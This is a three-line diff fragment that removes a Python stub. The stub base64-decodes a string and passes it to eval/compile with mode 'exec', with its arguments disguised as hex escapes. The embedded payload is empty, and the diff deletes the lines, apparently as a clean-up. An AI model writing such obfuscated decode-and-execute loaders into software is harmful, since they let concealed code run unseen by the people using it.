@@ -1,3 +1,0 @@
-import base64,codecs
-main = ""
-magic = eval(compile(base64.b64decode(eval('\x6d\x61\x69\x6e')),'\x3c\x73\x74\x72\x69\x6e\x67\x3e','\x65\x78\x65\x63'))
